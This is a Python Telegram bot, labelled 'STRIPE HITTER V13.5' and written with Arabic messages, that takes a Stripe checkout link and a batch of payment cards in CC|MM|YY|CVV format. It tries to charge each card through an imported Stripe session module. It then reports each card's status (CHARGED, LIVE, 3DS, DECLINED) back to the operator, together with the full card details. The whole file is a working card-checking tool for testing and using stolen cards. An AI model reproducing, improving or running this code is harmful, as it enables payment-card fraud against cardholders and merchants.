#!/usr/bin/env python3
import os, sys, json, re, time, random, threading, queue, asyncio
from datetime import datetime
from collections import defaultdict
import requests
from stripe_core import StripeSession, parse_card, log, C

try:
    from flask import Flask, jsonify
except ImportError:
    print("pip install flask --break-system-packages"); sys.exit(1)

TG_TOKEN = ""
TG_ADMIN = 0
user_state = {}
user_lock = threading.Lock()

_tq = queue.Queue()
_tg_sess = requests.Session()

def _tg_api(method, params):
    try:
        r = _tg_sess.post(f"https://api.telegram.org/bot{TG_TOKEN}/{method}", json=params, timeout=15)
        return r.json()
    except: return None

def _send(cid, text, rt=None):
    p = {"chat_id": cid, "text": text, "parse_mode": "HTML", "disable_web_page_preview": True}
    if rt: 
        p["reply_to_message_id"] = rt
    return _tg_api("sendMessage", p)

async def check_one_card(cid, mid, url, card, idx, total, summary, summary_lock):
    log(f"Card {idx}/{total} starting...", C.CYN)
    try:
        sess = StripeSession(url)
        ok, err = await sess.prefetch()
        if not ok:
            await sess.close()
            log(f"  prefetch: {err}", C.RED)
            async with summary_lock:
                summary["SESSION_EXPIRED"] += 1
            _send(cid, f"⚠️ <b>فشل الجلسة:</b>\n<code>{err}</code>", rt=mid)
            return
            
        r = await sess.charge(card)
        await sess.close()
        
        st = r["status"]
        async with summary_lock:
            summary[st] = summary.get(st, 0) + 1
        
        icon = {"CHARGED": "✅", "LIVE": "💚", "REQUIRES_ACTION": "🔐", "DECLINED": "❌", "ERROR": "⚠️", "SESSION_EXPIRED": "⚠️"}.get(st, "❌")
        
        body = (
            f"<b>🔥 STRIPE HITTER - V13.5 🔥</b>\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"{icon} <b>الحالة:</b> <code>{st} [{idx}/{total}]</code>\n"
            f"💳 <b>البطاقة:</b> <code>{r['card']}</code>\n"
            f"💰 <b>المبلغ:</b> <code>{r['amount']}</code>\n"
            f"⏱ <b>الوقت:</b> <code>{r['response_time']:.1f}s</code>\n"
            f"💬 <b>الرد:</b> <code>{r['message'][:120]}</code>\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"🛡 <i>تم الفحص بواسطة سكربت القوة</i>"
        )
        _send(cid, body, rt=mid)
    except Exception as e:
        log(f"  crash: {type(e).__name__}: {str(e)[:50]}", C.RED)
        _send(cid, f"⚠️ <b>بطاقة {idx}/{total}: فشلت</b>\n<code>{card['cc']}|{card['mm']}|{card['yy']}|{card['cvv']}</code>\n{str(e)[:50]}", rt=mid)

def process_task(cid, mid, url, cards):
    _send(cid, f"⏳ <b>جاري بدء فحص {len(cards)} بطاقة...</b>", rt=mid)
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    async def run():
        summary = defaultdict(int)
        summary_lock = asyncio.Lock()
        
        for i, card in enumerate(cards):
            await check_one_card(cid, mid, url, card, i+1, len(cards), summary, summary_lock)
            await asyncio.sleep(0.5)
            
        s = summary
        summary_text = (
            f"<b>📊 ملخص الفحص النهائي</b>\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"✅ CHARGED: <b>{s.get('CHARGED', 0)}</b>\n"
            f"💚 LIVE: <b>{s.get('LIVE', 0)}</b>\n"
            f"🔐 3DS / OTP: <b>{s.get('REQUIRES_ACTION', 0)}</b>\n"
            f"❌ DECLINED: <b>{s.get('DECLINED', 0)}</b>\n"
            f"⚠️ ERROR: <b>{s.get('ERROR', 0)}</b>\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"🎯 المجموع الفعال: {sum(s.values())}/{len(cards)}"
        )
        _send(cid, summary_text, rt=mid)
    
    try: 
        loop.run_until_complete(run())
    except Exception as e:
        log(f"run() crash: {e}", C.RED)
    finally: 
        loop.close()

def _worker():
    while True:
        item = _tq.get()
        if item is None: 
            continue
        cid, mid, url, cards = item
        try: 
            process_task(cid, mid, url, cards)
        except Exception as e: 
            _send(cid, f"⚠️ {str(e)[:80]}", rt=mid)
        finally: 
            _tq.task_done()

def parse_cards_block(text):
    return [c for c in (parse_card(l) for l in text.splitlines()) if c]

def _poll():
    global TG_ADMIN
    off = 0
    log("Bot live! /start", C.LIME)
    while True:
        try:
            r = _tg_api("getUpdates", {"offset": off, "timeout": 30, "allowed_updates": ["message"]})
            if not r or not r.get("ok"): 
                time.sleep(3)
                continue
            for u in r.get("result", []):
                off = u["update_id"] + 1
                m = u.get("message")
                if not m: 
                    continue
                cid = m["chat"]["id"]
                if cid != TG_ADMIN: 
                    continue
                txt = m.get("text", "").strip()
                mid = m["message_id"]
                
                if txt in ("/start", "/reset"):
                    with user_lock: 
                        user_state[cid] = {'step': 'url', 'url': None}
                    _send(cid, "🔥 <b>مرحباً بك في بوت Stripe Hitter الخارق</b>\n\n📎 <b>أرسل رابط Stripe (Checkout / Link):</b>", rt=mid)
                    continue
                    
                with user_lock: 
                    state = user_state.get(cid, {'step': 'url', 'url': None})
                    
                if state['step'] == 'url':
                    if not txt.startswith("http"):
                        _send(cid, "❌ <b>رابط غير صالح.</b> أرسل رابطاً تبدأ بـ https://", rt=mid)
                        continue
                    with user_lock: 
                        user_state[cid] = {'step': 'cards', 'url': txt}
                    _send(cid, f"✅ <b>تم حفظ الرابط بنجاح.</b>\n📨 أرسل البطاقات الآن بالصيغة (<code>CC|MM|YY|CVV</code>):", rt=mid)
                    continue
                    
                if state['step'] == 'cards':
                    cards = parse_cards_block(txt)
                    if not cards:
                        _send(cid, "❌ <b>خطأ في صيغة البطاقات!</b> استخدم صيغة: <code>CC|MM|YY|CVV</code>", rt=mid)
                        continue
                    url = state['url']
                    _tq.put((cid, mid, url, cards))
                    with user_lock: 
                        user_state[cid] = {'step': 'url', 'url': None}
                    _send(cid, f"📥 <b>تم استلام {len(cards)} بطاقة — بدأ الفحص الفوري...</b>", rt=mid)
                    continue
        except Exception as e:
            log(f"poll: {e}", C.RED)
            time.sleep(3)

if __name__ == "__main__":
    os.system("clear" if os.name != "nt" else "cls")
    print(f"{C.CYN}{C.B}═══ STRIPE BOT v13.5 (ULTRA) ═══{C.R}\n")
    TG_TOKEN = input(f"{C.GOLD}▸ Bot Token:{C.R} ").strip()
    try: 
        TG_ADMIN = int(input(f"{C.GOLD}▸ Admin ID:{C.R} ").strip())
    except ValueError: 
        sys.exit("ID must be numeric")
    
    _tg_api("deleteWebhook", {"drop_pending_updates": False})
    me = _tg_api("getMe", {})
    if me and me.get("ok"): 
        log(f"@{me['result']['username']}", C.LIME)
    
    threading.Thread(target=_worker, daemon=True).start()
    threading.Thread(target=_poll, daemon=True).start()
    log("جاهز لاستقبال الأوامر! /start", C.LIME)
    while True: 
        time.sleep(10)
